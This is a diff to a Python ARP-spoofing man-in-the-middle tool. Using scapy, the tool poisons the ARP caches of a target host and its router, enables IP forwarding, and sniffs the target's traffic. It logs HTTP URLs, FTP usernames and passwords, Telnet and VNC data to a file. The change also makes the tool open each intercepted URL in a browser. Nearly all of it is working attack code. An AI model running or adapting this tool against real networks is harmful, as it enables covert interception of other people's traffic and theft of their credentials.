@@ -6,6 +6,7 @@ import argparse
 import sys
 import os
 import time
+import webbrowser
 
 W  = '\033[0m'  # white
 R  = '\033[31m' # red
@@ -13,7 +14,7 @@ G  = '\033[32m' # green
 B  = '\033[34m' # blue
 
 logger = open("sMitm_log.text", "w+")
-logger.write("------------------Start---------------------\n")
+logger.write("----------Start----------\n")
 logger.write("----------%s----------\n" % time.strftime("%d/%m/%Y %H:%M:%S"))
 
 class Parser:
@@ -28,20 +29,20 @@ class Parser:
     oldHTTPload = ""
     HTTPfragged = False
     def __init__(self, options):
-        self.options = options 
-    
+        self.options = options
+
     def parseHandler(self, pkt):
-        if pkt[IP].src == self.options.target or pkt[IP].dst == self.options.target:    
+        if pkt[IP].src == self.options.target or pkt[IP].dst == self.options.target:
             if pkt.haslayer(Raw):
                 load = pkt[Raw].load
                 sport, dport = (pkt[TCP].sport, pkt[TCP].dport)
                 src_ip, dst_ip = (pkt[IP].src, pkt[IP].dst)
                 ack = pkt[IP].ack
-                
+
                 if sport in self.http_ports or dport in self.http_ports:
                     self.parseHttp(load, src_ip, dst_ip, ack)
                     #self.parseHttpUrl(load, src_ip, dst_ip)
-            
+
                 elif sport in self.vnc_ports or dport in self.vnc_ports:
                     self.parseVnc(load, src_ip, dst_ip)
 
@@ -53,7 +54,7 @@ class Parser:
 
                 elif sport in self.telnet_ports or dport in self.telnet_ports:
                     self.parseTelnet(load, src_ip, dst_ip)
-            
+
     def parseWhatsApp(self, load, src_ip, dst_ip):
         pass
 
@@ -81,6 +82,7 @@ class Parser:
                return
             print(R + "[*] HTTP " + http_type + ": " + G + url + B + " Source IP: " + src_ip + W + "\n")
             logger.write("[*] HTTP " + http_type + ": " + url + " Source IP: " + src_ip + "\n")
+            openUrlOnBrowser("Http://" + url)
         #if content_lines:
         #    print(content_lines)
 
@@ -101,19 +103,19 @@ class Parser:
         if "USER" in load:
             print(R + "[*] FTP " + G + load + " SERVER: " + dst_ip + B +
                 " Source IP: " + src_ip + W + "\n")
-            logger.write("[*] FTP " + load + " SERVER: " + dst_ip + " Source IP: " + 
+            logger.write("[*] FTP " + load + " SERVER: " + dst_ip + " Source IP: " +
                 src_ip + "\n")
 
         elif "PASS" in load:
             print(R + "[*] FTP " + G + load + " SERVER: " + dst_ip + B +
                 " Source IP: " + src_ip + W + "\n")
-            logger.write("[*] FTP " + load + " SERVER: " + dst_ip + " Source IP: " + 
+            logger.write("[*] FTP " + load + " SERVER: " + dst_ip + " Source IP: " +
                 src_ip + "\n")
 
         elif "authentication failed" in load:
             print(R + "[!] FTP " + G + load + " SERVER: " + dst_ip + B +
                 " Source IP: " + src_ip + W + "\n")
-            logger.write("[!] FTP " + load + " SERVER: " + dst_ip + " Source IP: " + 
+            logger.write("[!] FTP " + load + " SERVER: " + dst_ip + " Source IP: " +
                 src_ip + "\n")
 
     def parseMail(self, load, src_ip, dst_ip):
@@ -127,7 +129,7 @@ class Parser:
             load = " ".join(load, "")
         print(R + "[*] Telnet " + G + load + "SERVER: " + dst_ip + B +
             " Source IP: " + src_IP + W + "\n")
-        logger.write("[*] Telnet " + load + " SERVER: " + dst_ip + " Source IP: " + 
+        logger.write("[*] Telnet " + load + " SERVER: " + dst_ip + " Source IP: " +
                 src_IP + "\n")
 
     def parseVnc(self, load, src_ip, dst_ip):
@@ -167,7 +169,7 @@ class sMitm:
     def arpSpoof(self, routerIP, targetIP, routerMAC, victimMAC):
         send(ARP(op=2, psrc=targetIP, pdst=routerIP, hwsrc=victimMAC, hwdst=routerMAC), verbose=0)
         send(ARP(op=2, psrc=routerIP, pdst=targetIP, hwsrc=routerMAC, hwdst=victimMAC), verbose=0)
-        
+
     def getRouterMAC(self, ip):
         ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
         try:
@@ -186,13 +188,18 @@ class sMitm:
         if sys.platform[:3] == "dar":
             os.system("sysctl -w net.inet.ip.forwarding=1")  # forwarding ip for MAC OS X
         elif sys.platform[:3] == "lin":
-            os.system("sysctl -w net.ipv4.ip_forward=1")
-    
+            os.system("sysctl -w net.ipv4.ip_forward=1")    # forwarding ip for Linux
+
     def stopForwardPacket(self):
         if sys.platform[:3] == "dar":
             os.system("sysctl -w net.inet.ip.forwarding=0")
         elif sys.platform[:3] == "lin":
             os.system("sysctl -w net.ipv4.ip_forward=0")
+
+
+def openUrlOnBrowser(url):
+  webbrowser.open(url)
+
 
 def getUserOptions( ):
     parser = argparse.ArgumentParser( )
@@ -200,6 +207,7 @@ def getUserOptions( ):
     parser.add_argument("-rip", "--router", help="Router IP")
     parser.add_argument("-i", "--iface", help="Choose interface to use")
     return parser.parse_args( )
+
 
 def main( ):
     options = getUserOptions( )
@@ -217,6 +225,7 @@ def main( ):
     sniffThread = threading.Thread(target=sniff, kwargs=kw)
     sniffThread.start( )
 
+    print(R+'press "Ctrl+C" to exit' + W)
     print(R+"Interface: "+B+iface+W)
     print(R+"Target IP: "+B+target_ip + R+" --->> " + R+"Target MAC: " + B+target_mac+W)
     print(R+"Router IP: "+B+router_ip + R+" --->> " + R+"Router MAC: " + B+router_mac+W)
@@ -226,13 +235,15 @@ def main( ):
     while 1:
         try:
             mitm.arpSpoof(router_ip, target_ip, my_mac, my_mac)
-            time.sleep(1.5)
+            # mitm.arpSpoof("10.128.128.128", "10.213.72.51", my_mac, my_mac)
+            time.sleep(1)
         except KeyboardInterrupt:
             mitm.stopForwardPacket( )
-            logger.write("------------------End---------------------\n")
+            logger.write("----------End----------\n")
             logger.write("----------%s----------\n" % time.strftime("%d/%m/%Y %H:%M:%S"))
             logger.close( )
-            exit()
-    
+            sniffThread.join(1)
+            exit( )
+
 if __name__ == "__main__":
     main( )
